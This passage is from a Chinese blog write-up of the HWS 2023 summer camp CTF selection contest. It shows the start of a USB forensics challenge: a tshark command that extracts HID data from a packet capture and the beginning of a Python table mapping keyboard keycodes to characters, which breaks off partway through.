<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HWS第七期2023夏令营选拔赛 Writeup | YuGao&#39;s Blog</title><meta name="description" content="YuGao's Blog"><link rel="alternate" href="/rss.xml" title="YuGao's Blog" type="application/rss+xml"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple_touch_icon.png"><script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery-pjax@2.0.1/jquery.pjax.min.js"></script><link href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css" rel="stylesheet"><script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script><script>NProgress.configure({parent:"#loading-bar-wrapper"})</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 7.3.0"></head><div id="loading-bar-wrapper"></div><script>NProgress.start(),NProgress.inc(.2)</script><body><header class="l_header blur"><div class="wrapper"><div class="nav-main container container--flex"><a class="logo flat-box" href="/">YuGao's Blog</a><div class="menu"><ul class="h-list"><li><a id="home" class="nav flat-box" href="/"><i class="fas fa-home fa-fw"></i>&nbsp; 主页</a></li><li><a id="archives" class="nav flat-box" href="/archives/"><i class="fas fa-archive fa-fw"></i>&nbsp; 归档</a></li><li><a id="friends" class="nav flat-box" href="/friends/"><i class="fas fa-users fa-fw"></i>&nbsp; 友链</a></li><li><a id="about" class="nav flat-box" href="/about/"><i class="fas fa-user fa-fw"></i>&nbsp; 关于</a></li></ul></div><div class="m_search"><form name="searchform" class="form u-search-form"><input type="text" class="input u-search-input" placeholder="搜索"> <span class="icon"><i class="fas fa-search fa-fw"></i></span></form></div><ul class="switcher h-list"><li class="s-search"><a class="fas fa-search fa-fw" href="javascript:void(0)"></a></li><li class="s-menu"><a class="fas fa-bars fa-fw" href="javascript:void(0)"></a></li></ul></div><div class="nav-sub container container--flex"><a class="logo flat-box"></a><ul class="switcher h-list"><li class="s-comment"><a class="fas fa-comments fa-fw" href="javascript:void(0)"></a></li><li class="s-toc"><a class="flat-btn fas fa-list fa-fw" href="javascript:void(0)"></a></li></ul></div></div></header><aside class="menu-phone"><header><nav class="menu"><ul><li><a id="home" class="nav flat-box" href="/"><i class="fas fa-home fa-fw"></i>&nbsp; 主页</a></li><li><a id="archives" class="nav flat-box" href="/archives/"><i class="fas fa-archive fa-fw"></i>&nbsp; 归档</a></li><li><a id="friends" class="nav flat-box" href="/friends/"><i class="fas fa-users fa-fw"></i>&nbsp; 友链</a></li><li><a id="about" class="nav flat-box" href="/about/"><i class="fas fa-user fa-fw"></i>&nbsp; 关于</a></li></ul></nav></header></aside><div class="l_body"><script>NProgress.inc(.4)</script><div class="container clearfix" id="pjax-container"><div class="l_main"><article id="post" class="card-shadow blur post article-type-post" itemscope itemprop="blogPost"><section class="meta"><div class="meta" id="header-meta"><h1 class="title">HWS第七期2023夏令营选拔赛 Writeup</h1><time class="metatag time"><i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i> 2023-07-29 星期六</time><div class="metatag cats"><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i> &nbsp;<a class="categories" href="/categories/CTF/">CTF</a>&nbsp;/&nbsp;<a class="categories" href="/categories/CTF/HWS/">HWS</a></div><div class="metatag browse leancloud"><i class="fas fa-eye fa-fw" aria-hidden="true"></i> <span id="/p/20fb689d.html" class="leancloud_visitors" data-flag-title="HWS第七期2023夏令营选拔赛 Writeup"><span>被浏览</span> <span class="leancloud-visitors-count"></span> <span>次</span></span></div></div></section><section class="article typo"><div class="article-entry" itemprop="articleBody"><p>暑假参加了 HWS 夏令营选拔赛，最近整理文件的时候想着记录一下。</p><p><s>其实是博客没更新太久想着更新一下</s></p><span id="more"></span><h2 id="MISC">MISC</h2><h3 id="USB">USB</h3><p>发现 2.3.1 设备传输了很多 HID Data，用 tshark 把 HID Data dump 出来</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tshark.exe -r misc1.pcapng -T fields -e usbhid.data</span><br></pre></td></tr></table></figure><p>得到很多 8 字节的数据，数据格式与 HID 键盘一样，输入报告格式详见</p><p><a target="_blank" rel="noopener" href="https://www.usbzh.com/article/detail-326.html">https://www.usbzh.com/article/detail-326.html</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> NamedTemporaryFile</span><br><span class="line"></span><br><span class="line">BOOT_KEYBOARD_MAP = &#123;</span><br><span class="line">    <span class="number">0x00</span>: (<span class="literal">None</span>, <span class="literal">None</span>),                         <span class="comment"># Reserved (no event indicated)</span></span><br><span class="line">    <span class="number">0x01</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># ErrorRollOver</span></span><br><span class="line">    <span class="number">0x02</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># POSTFail</span></span><br><span class="line">    <span class="number">0x03</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># ErrorUndefined</span></span><br><span class="line">    <span class="number">0x04</span>: (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;A&#x27;</span>),                           <span class="comment"># a</span></span><br><span class="line">    <span class="number">0x05</span>: (<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;B&#x27;</span>),                           <span class="comment"># b</span></span><br><span class="line">    <span class="number">0x06</span>: (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;C&#x27;</span>),                           <span class="comment"># c</span></span><br><span class="line">    <span class="number">0x07</span>: (<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;D&#x27;</span>),                           <span class="comment"># d</span></span><br><span class="line">    <span class="number">0x08</span>: (<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;E&#x27;</span>),                           <span class="comment"># e</span></span><br><span class="line">    <span class="number">0x09</span>: (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;F&#x27;</span>),                           <span class="comment"># f</span></span><br><span class="line">    <span class="number">0x0a</span>: (<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;G&#x27;</span>),                           <span class="comment"># g</span></span><br><span class="line">    <span class="number">0x0b</span>: (<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;H&#x27;</span>),                           <span class="comment"># h</span></span><br><span class="line">    <span class="number">0x0c</span>: (<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;I&#x27;</span>),                           <span class="comment"># i</span></span><br><span class="line">    <span class="number">0x0d</span>: (<span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;J&#x27;</span>),                           <span class="comment"># j</span></span><br><span class="line">    <span class="number">0x0e</span>: (<span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;K&#x27;</span>),                           <span class="comment"># k</span></span><br><span class="line">    <span class="number">0x0f</span>: (<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;L&#x27;</span>),                           <span class="comment"># l</span></span><br><span class="line">    <span class="number">0x10</span>: (<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;M&#x27;</span>),                           <span class="comment"># m</span></span><br><span class="line">    <span class="number">0x11</span>: (<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;N&#x27;</span>),                           <span class="comment"># n</span></span><br><span class="line">    <span class="number">0x12</span>: (<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;O&#x27;</span>),                           <span class="comment"># o</span></span><br><span class="line">    <span class="number">0x13</span>: (<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;P&#x27;</span>),                           <span class="comment"># p</span></span><br><span class="line">    <span class="number">0x14</span>: (<span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>),                           <span class="comment"># q</span></span><br><span class="line">    <span class="number">0x15</span>: (<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;R&#x27;</span>),                           <span class="comment"># r</span></span><br><span class="line">    <span class="number">0x16</span>: (<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;S&#x27;</span>),                           <span class="comment"># s</span></span><br><span class="line">    <span class="number">0x17</span>: (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;T&#x27;</span>),                           <span class="comment"># t</span></span><br><span class="line">    <span class="number">0x18</span>: (<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;U&#x27;</span>),                           <span class="comment"># u</span></span><br><span class="line">    <span class="number">0x19</span>: (<span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;V&#x27;</span>),                           <span class="comment"># v</span></span><br><span class="line">    <span class="number">0x1a</span>: (<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;W&#x27;</span>),                           <span class="comment"># w</span></span><br><span class="line">    <span class="number">0x1b</span>: (<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;X&#x27;</span>),                           <span class="comment"># x</span></span><br><span class="line">    <span class="number">0x1c</span>: (<span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>),                           <span class="comment"># y</span></span><br><span class="line">    <span class="number">0x1d</span>: (<span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>),                           <span class="comment"># z</span></span><br><span class="line">    <span class="number">0x1e</span>: (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;!&#x27;</span>),                           <span class="comment"># 1</span></span><br><span class="line">    <span class="number">0x1f</span>: (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;@&#x27;</span>),                           <span class="comment"># 2</span></span><br><span class="line">    <span class="number">0x20</span>: (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;#&#x27;</span>),                           <span class="comment"># 3</span></span><br><span class="line">    <span class="number">0x21</span>: (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;$&#x27;</span>),                           <span class="comment"># 4</span></span><br><span class="line">    <span class="number">0x22</span>: (<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;%&#x27;</span>),                           <span class="comment"># 5</span></span><br><span class="line">    <span class="number">0x23</span>: (<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;^&#x27;</span>),                           <span class="comment"># 6</span></span><br><span class="line">    <span class="number">0x24</span>: (<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>),                           <span class="comment"># 7</span></span><br><span class="line">    <span class="number">0x25</span>: (<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;*&#x27;</span>),                           <span class="comment"># 8</span></span><br><span class="line">    <span class="number">0x26</span>: (<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;(&#x27;</span>),                           <span class="comment"># 9</span></span><br><span class="line">    <span class="number">0x27</span>: (<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;)&#x27;</span>),                           <span class="comment"># 0</span></span><br><span class="line">    <span class="number">0x28</span>: (<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>),                         <span class="comment"># Return (ENTER)</span></span><br><span class="line">    <span class="number">0x29</span>: (<span class="string">&#x27;[ESC]&#x27;</span>, <span class="string">&#x27;[ESC]&#x27;</span>),                   <span class="comment"># Escape</span></span><br><span class="line">    <span class="number">0x2a</span>: (<span class="string">&#x27;\b&#x27;</span>, <span class="string">&#x27;\b&#x27;</span>),                         <span class="comment"># Backspace</span></span><br><span class="line">    <span class="number">0x2b</span>: (<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>),                         <span class="comment"># Tab</span></span><br><span class="line">    <span class="number">0x2c</span>: (<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27; &#x27;</span>),                           <span class="comment"># Spacebar</span></span><br><span class="line">    <span class="number">0x2d</span>: (<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>),                           <span class="comment"># -</span></span><br><span class="line">    <span class="number">0x2e</span>: (<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;+&#x27;</span>),                           <span class="comment"># =</span></span><br><span class="line">    <span class="number">0x2f</span>: (<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>),                           <span class="comment"># [</span></span><br><span class="line">    <span class="number">0x30</span>: (<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>),                           <span class="comment"># ]</span></span><br><span class="line">    <span class="number">0x31</span>: (<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;|&#x27;</span>),                          <span class="comment"># \</span></span><br><span class="line">    <span class="number">0x32</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Non-US # and ~</span></span><br><span class="line">    <span class="number">0x33</span>: (<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>),                           <span class="comment"># ;</span></span><br><span class="line">    <span class="number">0x34</span>: (<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>),                          <span class="comment"># &#x27;</span></span><br><span class="line">    <span class="number">0x35</span>: (<span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;~&#x27;</span>),                           <span class="comment"># `</span></span><br><span class="line">    <span class="number">0x36</span>: (<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>),                           <span class="comment"># ,</span></span><br><span class="line">    <span class="number">0x37</span>: (<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>),                           <span class="comment"># .</span></span><br><span class="line">    <span class="number">0x38</span>: (<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;?&#x27;</span>),                           <span class="comment"># /</span></span><br><span class="line">    <span class="number">0x39</span>: (<span class="string">&#x27;[CAPSLOCK]&#x27;</span>, <span class="string">&#x27;[CAPSLOCK]&#x27;</span>),         <span class="comment"># Caps Lock</span></span><br><span class="line">    <span class="number">0x3a</span>: (<span class="string">&#x27;[F1]&#x27;</span>, <span class="string">&#x27;[F1]&#x27;</span>),                     <span class="comment"># F1</span></span><br><span class="line">    <span class="number">0x3b</span>: (<span class="string">&#x27;[F2]&#x27;</span>, <span class="string">&#x27;[F2]&#x27;</span>),                     <span class="comment"># F2</span></span><br><span class="line">    <span class="number">0x3c</span>: (<span class="string">&#x27;[F3]&#x27;</span>, <span class="string">&#x27;[F3]&#x27;</span>),                     <span class="comment"># F3</span></span><br><span class="line">    <span class="number">0x3d</span>: (<span class="string">&#x27;[F4]&#x27;</span>, <span class="string">&#x27;[F4]&#x27;</span>),                     <span class="comment"># F4</span></span><br><span class="line">    <span class="number">0x3e</span>: (<span class="string">&#x27;[F5]&#x27;</span>, <span class="string">&#x27;[F5]&#x27;</span>),                     <span class="comment"># F5</span></span><br><span class="line">    <span class="number">0x3f</span>: (<span class="string">&#x27;[F6]&#x27;</span>, <span class="string">&#x27;[F6]&#x27;</span>),                     <span class="comment"># F6</span></span><br><span class="line">    <span class="number">0x40</span>: (<span class="string">&#x27;[F7]&#x27;</span>, <span class="string">&#x27;[F7]&#x27;</span>),                     <span class="comment"># F7</span></span><br><span class="line">    <span class="number">0x41</span>: (<span class="string">&#x27;[F8]&#x27;</span>, <span class="string">&#x27;[F8]&#x27;</span>),                     <span class="comment"># F8</span></span><br><span class="line">    <span class="number">0x42</span>: (<span class="string">&#x27;[F9]&#x27;</span>, <span class="string">&#x27;[F9]&#x27;</span>),                     <span class="comment"># F9</span></span><br><span class="line">    <span class="number">0x43</span>: (<span class="string">&#x27;[F10]&#x27;</span>, <span class="string">&#x27;[F10]&#x27;</span>),                   <span class="comment"># F10</span></span><br><span class="line">    <span class="number">0x44</span>: (<span class="string">&#x27;[F11]&#x27;</span>, <span class="string">&#x27;[F11]&#x27;</span>),                   <span class="comment"># F11</span></span><br><span class="line">    <span class="number">0x45</span>: (<span class="string">&#x27;[F12]&#x27;</span>, <span class="string">&#x27;[F12]&#x27;</span>),                   <span class="comment"># F12</span></span><br><span class="line">    <span class="number">0x46</span>: (<span class="string">&#x27;[PRINTSCREEN]&#x27;</span>, <span class="string">&#x27;[PRINTSCREEN]&#x27;</span>),   <span class="comment"># Print Screen</span></span><br><span class="line">    <span class="number">0x47</span>: (<span class="string">&#x27;[SCROLLLOCK]&#x27;</span>, <span class="string">&#x27;[SCROLLLOCK]&#x27;</span>),     <span class="comment"># Scroll Lock</span></span><br><span class="line">    <span class="number">0x48</span>: (<span class="string">&#x27;[PAUSE]&#x27;</span>, <span class="string">&#x27;[PAUSE]&#x27;</span>),               <span class="comment"># Pause</span></span><br><span class="line">    <span class="number">0x49</span>: (<span class="string">&#x27;[INSERT]&#x27;</span>, <span class="string">&#x27;[INSERT]&#x27;</span>),             <span class="comment"># Insert</span></span><br><span class="line">    <span class="number">0x4a</span>: (<span class="string">&#x27;[HOME]&#x27;</span>, <span class="string">&#x27;[HOME]&#x27;</span>),                 <span class="comment"># Home</span></span><br><span class="line">    <span class="number">0x4b</span>: (<span class="string">&#x27;[PAGEUP]&#x27;</span>, <span class="string">&#x27;[PAGEUP]&#x27;</span>),             <span class="comment"># Page Up</span></span><br><span class="line">    <span class="number">0x4c</span>: (<span class="string">&#x27;[DELETE]&#x27;</span>, <span class="string">&#x27;[DELETE]&#x27;</span>),             <span class="comment"># Delete Forward</span></span><br><span class="line">    <span class="number">0x4d</span>: (<span class="string">&#x27;[END]&#x27;</span>, <span class="string">&#x27;[END]&#x27;</span>),                   <span class="comment"># End</span></span><br><span class="line">    <span class="number">0x4e</span>: (<span class="string">&#x27;[PAGEDOWN]&#x27;</span>, <span class="string">&#x27;[PAGEDOWN]&#x27;</span>),         <span class="comment"># Page Down</span></span><br><span class="line">    <span class="number">0x4f</span>: (<span class="string">&#x27;[RIGHTARROW]&#x27;</span>, <span class="string">&#x27;[RIGHTARROW]&#x27;</span>),     <span class="comment"># Right Arrow</span></span><br><span class="line">    <span class="number">0x50</span>: (<span class="string">&#x27;[LEFTARROW]&#x27;</span>, <span class="string">&#x27;[LEFTARROW]&#x27;</span>),       <span class="comment"># Left Arrow</span></span><br><span class="line">    <span class="number">0x51</span>: (<span class="string">&#x27;[DOWNARROW]&#x27;</span>, <span class="string">&#x27;[DOWNARROW]&#x27;</span>),       <span class="comment"># Down Arrow</span></span><br><span class="line">    <span class="number">0x52</span>: (<span class="string">&#x27;[UPARROW]&#x27;</span>, <span class="string">&#x27;[UPARROW]&#x27;</span>),           <span class="comment"># Up Arrow</span></span><br><span class="line">    <span class="number">0x53</span>: (<span class="string">&#x27;[NUMLOCK]&#x27;</span>, <span class="string">&#x27;[NUMLOCK]&#x27;</span>),           <span class="comment"># Num Lock</span></span><br><span class="line">    <span class="number">0x54</span>: (<span class="string">&#x27;[KEYPADSLASH]&#x27;</span>, <span class="string">&#x27;/&#x27;</span>),               <span class="comment"># Keypad /</span></span><br><span class="line">    <span class="number">0x55</span>: (<span class="string">&#x27;[KEYPADASTERISK]&#x27;</span>, <span class="string">&#x27;*&#x27;</span>),            <span class="comment"># Keypad *</span></span><br><span class="line">    <span class="number">0x56</span>: (<span class="string">&#x27;[KEYPADMINUS]&#x27;</span>, <span class="string">&#x27;-&#x27;</span>),               <span class="comment"># Keypad -</span></span><br><span class="line">    <span class="number">0x57</span>: (<span class="string">&#x27;[KEYPADPLUS]&#x27;</span>, <span class="string">&#x27;+&#x27;</span>),                <span class="comment"># Keypad +</span></span><br><span class="line">    <span class="number">0x58</span>: (<span class="string">&#x27;[KEYPADENTER]&#x27;</span>, <span class="string">&#x27;[KEYPADENTER]&#x27;</span>),   <span class="comment"># Keypad ENTER</span></span><br><span class="line">    <span class="number">0x59</span>: (<span class="string">&#x27;[KEYPAD1]&#x27;</span>, <span class="string">&#x27;1&#x27;</span>),                   <span class="comment"># Keypad 1 and End</span></span><br><span class="line">    <span class="number">0x5a</span>: (<span class="string">&#x27;[KEYPAD2]&#x27;</span>, <span class="string">&#x27;2&#x27;</span>),                   <span class="comment"># Keypad 2 and Down Arrow</span></span><br><span class="line">    <span class="number">0x5b</span>: (<span class="string">&#x27;[KEYPAD3]&#x27;</span>, <span class="string">&#x27;3&#x27;</span>),                   <span class="comment"># Keypad 3 and PageDn</span></span><br><span class="line">    <span class="number">0x5c</span>: (<span class="string">&#x27;[KEYPAD4]&#x27;</span>, <span class="string">&#x27;4&#x27;</span>),                   <span class="comment"># Keypad 4 and Left Arrow</span></span><br><span class="line">    <span class="number">0x5d</span>: (<span class="string">&#x27;[KEYPAD5]&#x27;</span>, <span class="string">&#x27;5&#x27;</span>),                   <span class="comment"># Keypad 5</span></span><br><span class="line">    <span class="number">0x5e</span>: (<span class="string">&#x27;[KEYPAD6]&#x27;</span>, <span class="string">&#x27;6&#x27;</span>),                   <span class="comment"># Keypad 6 and Right Arrow</span></span><br><span class="line">    <span class="number">0x5f</span>: (<span class="string">&#x27;[KEYPAD7]&#x27;</span>, <span class="string">&#x27;7&#x27;</span>),                   <span class="comment"># Keypad 7 and Home</span></span><br><span class="line">    <span class="number">0x60</span>: (<span class="string">&#x27;[KEYPAD8]&#x27;</span>, <span class="string">&#x27;8&#x27;</span>),                   <span class="comment"># Keypad 8 and Up Arrow</span></span><br><span class="line">    <span class="number">0x61</span>: (<span class="string">&#x27;[KEYPAD9]&#x27;</span>, <span class="string">&#x27;9&#x27;</span>),                   <span class="comment"># Keypad 9 and Page Up</span></span><br><span class="line">    <span class="number">0x62</span>: (<span class="string">&#x27;[KEYPAD0]&#x27;</span>, <span class="string">&#x27;0&#x27;</span>),                   <span class="comment"># Keypad 0 and Insert</span></span><br><span class="line">    <span class="number">0x63</span>: (<span class="string">&#x27;[KEYPADPERIOD]&#x27;</span>, <span class="string">&#x27;.&#x27;</span>),              <span class="comment"># Keypad . and Delete</span></span><br><span class="line">    <span class="number">0x64</span>: (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>),                             <span class="comment"># Non-US \ and 